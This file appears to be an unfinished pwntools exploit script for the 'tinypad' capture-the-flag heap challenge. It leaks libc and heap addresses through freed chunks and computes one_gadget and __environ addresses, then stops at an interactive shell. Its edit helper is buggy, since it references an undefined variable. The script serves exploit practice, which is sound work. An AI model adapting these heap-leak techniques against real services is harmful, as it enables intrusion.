#! /usr/bin/env python3
from pwn import *

arch = 64
challenge = './tinypad1'

context.os='linux'
context.log_level = 'debug'
if arch==64:
    context.arch='amd64'
if arch==32:
    context.arch='i386'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF(challenge)
libc = ELF('libc.so.6')

local = 1
if local:
    p = process(challenge)
else:
    p = remote('chuj.top', '53178')


def debug():
    gdb.attach(p)
    pause()

bps = [0x400B20,]
pie = 0
def gdba():
    if local == 0:
        return 0
    cmd ='set follow-fork-mode parent\n'
    #cmd=''
    if pie:
        base = int(os.popen("pmap {}|awk '{{print $1}}'".format(p.pid)).readlines()[1],16)
        cmd += ''.join(['b *{:#x}\n'.format(b+base) for b in bps])
        cmd += 'set $base={:#x}\n'.format(base)
    else:
        cmd+=''.join(['b *{:#x}\n'.format(b) for b in bps])

    gdb.attach(p,cmd)

def eat(lett):
    p.recvuntil('| [Q] Quit                                                                     |\n')
    p.recvuntil('+------------------------------------------------------------------------------+\n')
    p.recvuntil('(CMD)>>> ')
    p.sendline(lett)

def create(size, content):
    eat('A')
    p.recvuntil('(SIZE)>>> ')
    p.sendline(str(size))
    p.recvuntil('(CONTENT)>>> ')
    p.send(content)

def edit(index, num, s):
    eat('E')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(index))
    p.recvuntil('(CONTENT)>>> ')
    p.send(content)
    p.recvuntil('Is it OK?\n')
    p.recvuntil('(Y/n)>>> ')
    p.sendline('y')

def delete(index):
    eat('D')
    p.recvuntil('(INDEX)>>> ')
    p.sendline(str(index))

def quit(index):
    eat('Q')


create(0x98,'1'*0x97+'\n')
create(0x78,'1'*0x77+'\n')
create(0x78,'1'*0x77+'\n')
delete(1)
unsortedbin_addr = u64(p.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
log.success('unsortedbin_addr: ' + hex(unsortedbin_addr))
libc.address = unsortedbin_addr - 0x3c4b78
log.success('libc_addr: ' + hex(libc.address))

one_gadget = [0x45216, 0x4526a, 0xf02a4, 0xf1147]
one_gadget_addr = libc.address + one_gadget[1]
log.success('one_gadget_addr: ' + hex(one_gadget_addr))

environ_addr = libc.symbols['__environ'] #用来泄露 main 返回地址
log.success('environ_addr: ' + hex(environ_addr))

delete(2)
delete(3)
heap_addr = u64(p.recvuntil(b'\x60')[-3:].ljust(8, b'\x00'))
log.success('heap_addr: ' + hex(heap_addr))



p.interactive()